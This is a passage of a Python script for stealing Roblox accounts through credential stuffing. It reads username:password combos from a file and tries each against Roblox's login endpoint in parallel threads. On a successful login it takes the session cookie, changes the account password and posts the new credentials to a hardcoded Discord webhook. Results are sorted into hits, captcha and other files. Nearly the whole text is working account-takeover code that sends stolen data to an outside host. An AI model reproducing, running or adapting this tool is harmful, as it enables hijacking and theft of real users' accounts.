r8lUL2zc0L6EQC8zAJOB3HzVjd+LIpv0roY4XrrtzuREhYDbFX8ACpwIxQGaR4JxGsKC0l7Qjb9xYAwvpZF73UfDatKKrivQ0RwdrtFhbqeD8i0XvE=",
            'ctype': 'Username',
            'cvalue': self.combo[0],
            'password': self.combo[1],
            'secureAuthenticationIntent': {
                'clientPublicKey': 'MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAErvV/jggyO+X2ZLbt6u54Kh6NsSvWJ6ISM6wYC/7/E4IQmOdP/XKdeqVigRcIgFhkHNp31JdibBZWf04zaWaiIA==',
                'clientEpochTimestamp': 1710615345,
                'serverNonce': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6Ijg3UUc2WDM4TUI0M1FKWFIiLCJuYmYiOjE3MTA2MTUzNDQsImV4cCI6MTcxMDYxNTY0NCwiaWF0IjoxNzEwNjE1MzQ0LCJpc3MiOiJoYmEtc2VydmljZSJ9.4xy6oUv7imYAh6d6kAcDSAbSYcmxmdQH4QE6enGicZs',
                'saiSignature': 'kwF6NeWK5+KN/JzgsI3pr6TiaJJ4rqPg8HCwwZaDbB8jP1BDWDPpuNvHxIYAiRODkhbPVpPo2h1rCWG+t34Wvg==',
            },
        }

        response = self.client.post('https://auth.roblox.com/v2/login', headers=headers, json=json_data,cookies=cookies)
        print(response.text)
        try:
            username = response.json()["user"]["name"]
            cookie = response.cookies.get(".ROBLOSECURITY")
            new_password = change_password(self.client, self.csrf, self.combo[1], cookie)
            comboss= f"{self.combo[0]}:{new_password[0]}  @everyone"
            webhook1 = DiscordWebhook(url="https://discord.com/api/webhooks/1218785469366800467/2b8IALGcM__Mcay8cCgVt-OLINtDhNniMkPdQovqHL0M9w843f_xnqJz4XObfikqgwHJ", content=comboss)
            webhook1.execute()
            print(Fore.GREEN + f"[Hit] - {username}" + Style.RESET_ALL)
            with open("data/hits.txt", "a") as file:
                file.write(f"{self.combo[0]}:{new_password[0]}:{new_password[1]}\n")
            return
        except:
            try:
                response.headers["rblx-challenge-metadata"]
                with open("data/captcha.txt", "a") as file:
                    file.write(f"{self.combo[0]}:{self.combo[1]}\n")
                print(Fore.YELLOW + f"[Captcha]" + Style.RESET_ALL)
                return
            except:
                print(Fore.RED + f"[Bad]" + Style.RESET_ALL)
                pass
        if response.status_code == 200:
            print(Fore.CYAN + "[Special]" + Style.RESET_ALL)
            with open("data/special.txt", "a") as file:
                file.write(f"{self.combo[0]}:{self.combo[1]}\n")
            return
def process_combo(combo):
    try:
        steal_accounts(combo)
    except Exception as e:
        print(e)

def run_steal_accounts():
    with open("combos.txt", "r") as file:
        combos = file.read().splitlines()
    with ThreadPoolExecutor(max_workers=5) as executor:
        executor.map(process_combo, combos)

if __name__ == "__main__":
    run_steal_accounts()